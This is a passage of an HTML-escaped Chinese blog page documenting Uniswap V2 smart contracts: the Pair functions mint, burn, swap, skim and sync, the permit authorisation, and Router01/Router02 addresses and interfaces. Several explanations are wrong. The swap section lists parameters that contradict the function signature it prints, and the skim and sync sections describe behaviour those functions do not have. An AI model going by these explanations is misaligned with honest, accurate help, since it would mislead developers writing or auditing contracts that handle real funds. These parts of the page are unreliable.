20,000）。&lt;/p&gt;&#xA;&lt;p&gt;kLast是一个在Uniswap合约中的函数，它用于记录交易之前的&amp;quot;k&amp;quot;值。具体来说，当一个交易对发生交易时，该函数会记录下当前交易对的&amp;quot;k&amp;quot;值，并在交易完成后更新&amp;quot;k&amp;quot;值。这样做的目的是为了方便后续计算交易手续费。&lt;/p&gt;&#xA;&lt;p&gt;在每次交易完成后，&amp;ldquo;k&amp;quot;值都会更新，因此记录下交易之前的&amp;quot;k&amp;quot;值可以方便地计算出交易手续费。如果没有记录下&amp;quot;k&amp;quot;值，计算交易手续费将会更加复杂，因为需要重新计算交易对的&amp;quot;k&amp;quot;值。&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;mint&#34;&gt;&lt;span&gt;mint&lt;/span&gt;&#xA;  &lt;a href=&#34;#mint&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;function mint(address to) external returns (uint liquidity);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;铸造该Pair的流动性代币&lt;/p&gt;&#xA;&lt;p&gt;它会触发 &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#mint&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Mint&lt;/a&gt;, &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#sync&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Sync&lt;/a&gt;, &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair-erc-20#transfer&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Transfer&lt;/a&gt; 事件&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;burn&#34;&gt;&lt;span&gt;burn&lt;/span&gt;&#xA;  &lt;a href=&#34;#burn&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;function burn(address to) external returns (uint amount0, uint amount1);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;销毁该Pair的流动性代币&lt;/p&gt;&#xA;&lt;p&gt;它会触发&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#burn&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Burn&lt;/a&gt;, &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#sync&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Sync&lt;/a&gt;, &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair-erc-20#transfer&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Transfer&lt;/a&gt; 事件&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;swap&#34;&gt;&lt;span&gt;swap&lt;/span&gt;&#xA;  &lt;a href=&#34;#swap&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;swap&lt;/code&gt;是用于执行资产交易的函数。当用户想要交换一种代币或加密货币为另一种代币或加密货币时，他们会调用该函数。&lt;/p&gt;&#xA;&lt;p&gt;swap函数的参数包括输入代币的地址、输出代币的地址、输入代币的数量、输出代币的最小数量和交易的接收地址。其中，输入代币的地址和数量是必需的，而输出代币的地址和最小数量是可选的。&lt;/p&gt;&#xA;&lt;p&gt;当用户调用swap函数时，Uniswap合约会自动计算输出代币的数量，并将其转移到交易的接收地址。在这个过程中，Uniswap合约会根据交易对中的&amp;quot;k&amp;quot;值来计算交易手续费，并将其分配给流动性提供者和Uniswap协议。&lt;/p&gt;&#xA;&lt;p&gt;需要注意的是，由于Uniswap采用自动做市商模型，交易对中的价格是由市场供需关系动态决定的，因此在执行swap函数时，交易对的价格可能已经发生了变化，从而影响到交易的成交价格和数量。&lt;/p&gt;&#xA;&lt;p&gt;它会触发 &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#swap&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Swap&lt;/a&gt;, [Sync 事件.&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;skim&#34;&gt;&lt;span&gt;skim&lt;/span&gt;&#xA;  &lt;a href=&#34;#skim&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;function skim(address to) external;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当交易对中的其中一种代币被交易时，交易对中的另一种代币的数量会发生变化。这个变化会影响交易对中的比例，从而影响到交易对的价格。&lt;/p&gt;&#xA;&lt;p&gt;skim函数是Uniswap交易对合约中的一个函数，其作用是将一个代币从交易对中提取出来，使得交易对中的两种代币之间的比例重新平衡。这个过程通常发生在交易对中某一种代币流动性不足时，需要将交易对中的另一种代币提取出来以增加流动性。&lt;/p&gt;&#xA;&lt;p&gt;具体来说，当一个代币被从交易对中提取出来时，skim函数会将代币的数量除以交易对中剩余另一种代币的数量，从而确定提取的代币在当前价格下的价值。然后，这个价值会从交易对中另一种代币的余额中减去，以重新平衡交易对中两种代币的比例。&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;sync&#34;&gt;&lt;span&gt;sync&lt;/span&gt;&#xA;  &lt;a href=&#34;#sync&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;function sync() external;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当某个交易对的价格发生变化时，需要调整交易对的储备量（Reserve），以确保交易对中代币的比例始终保持不变。这个过程就是通过Sync函数实现的。&lt;/p&gt;&#xA;&lt;p&gt;具体来说，Sync函数会计算出当前交易对中每个代币的储备量，并将其与区块链上实际的代币储备量进行比较。如果区块链上的代币储备量与计算出来的储备量不一致，Sync函数会调整交易对的储备量，使其与区块链上的储备量一致。这个过程会同时更新交易对的价格，并在交易对中添加或移除代币。&lt;/p&gt;&#xA;&lt;p&gt;需要注意的是，Sync函数并不是直接调整交易对的价格，而是通过调整交易对中的储备量来影响价格。因此，在Sync函数调用之前，需要先进行价格计算，以确定储备量需要被调整的方向。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;pair-erc20&#34;&gt;&lt;span&gt;Pair (ERC20)&lt;/span&gt;&#xA;  &lt;a href=&#34;#pair-erc20&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/Pair-ERC-20#allowance&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/Pair-ERC-20#allowance&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;参考上面的链接, 为流动性代币实现的ERC20的相关功能&lt;/p&gt;&#xA;&lt;p&gt;特别说明的是permit&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;permit&#34;&gt;&lt;span&gt;permit&lt;/span&gt;&#xA;  &lt;a href=&#34;#permit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;它的作用是让一个地址 spender 能够代表一个地址 owner 进行一定数量的代币交易，而不需要在每次交易之前都得到 owner 的授权&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;permit&lt;/code&gt; 函数是 ERC20 中的一种新型授权机制，它允许用户在一次操作中同时授权 spender 进行一定数量的代币交易，并设置一个过期时间 deadline。通过 permit 函数进行授权，可以避免用户在每次交易之前都需要通过传统的 approve 函数进行授权过程。&lt;/p&gt;&#xA;&lt;p&gt;而 Uniswap 中的 permit 函数则是将这种授权机制集成到了交易过程中。当某个地址需要进行交易时，它可以先调用 permit 函数进行授权，然后再直接进行交易。这样既方便了用户，也提高了交易的效率。&lt;/p&gt;&#xA;&lt;p&gt;owner：需要进行授权的地址；&#xA;spender：被授权的地址；&#xA;value：被授权的代币数量；&#xA;deadline：授权过期时间戳；&#xA;v、r、s：用于签名验证的参数(ECDSA 签名算法)&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;需要注意的是，这个函数需要用户先对授权进行签名，因此它并不是直接调用的。一般来说，用户需要通过一些其他的工具或者库来进行签名，然后再将签名后的数据作为参数传入到 permit 函数中。&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;router01&#34;&gt;&lt;span&gt;Router01&lt;/span&gt;&#xA;  &lt;a href=&#34;#router01&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;地址  &lt;a href=&#34;https://etherscan.io/address/0xf164fC0Ec4E93095b804a4795bBe1e041497b92a&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0xf164fC0Ec4E93095b804a4795bBe1e041497b92a&lt;/a&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Router01有bug被弃用了&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;router02&#34;&gt;&lt;span&gt;Router02&lt;/span&gt;&#xA;  &lt;a href=&#34;#router02&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;地址-2&#34;&gt;&lt;span&gt;地址&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%9c%b0%e5%9d%80-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://etherscan.io/address/0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;接口-2&#34;&gt;&lt;span&gt;接口&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%8e%a5%e5%8f%a3-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/Uniswap/v2-periphery&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/Uniswap/v2-periphery&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;import &amp;#39;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;import IUniswapV2Router02 from &amp;#39;@uniswap/v2-periphery/build/IUniswapV2Router02.json&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;factory-1&#34;&gt;&lt;span&gt;factory&lt;/span&gt;&#xA;  &lt;a href=&#34;#factory-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;返回facotry合约地址&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function factory() external pure returns (address);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;weth&#34;&gt;&lt;span&gt;WETH&lt;/span&gt;&#xA;  &lt;a href=&#34;#weth&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;返回 WETH的地址,  关于WETH: &lt;a href=&#34;https://blog.0xproject.com/canonical-weth-a9aa7d0279dd&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://blog.0xproject.com/canonical-weth-a9aa7d0279dd&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function WETH() external pure returns (address);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;quote-getamountout-getamountin-getamountsout-getamountsin&#34;&gt;&lt;span&gt;quote getAmountOut getAmountIn getAmountsOut getAmountsIn&lt;/span&gt;&#xA;  &lt;a href=&#34;#quote-getamountout-getamountin-getamountsout-getamountsin&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;参考 &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/library&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Library合约&lt;/a&gt;中的相关函数&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;addliquidity&#34;&gt;&lt;span&gt;addLiquidity&lt;/span&gt;&#xA;  &lt;a href=&#34;#addliquidity&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; 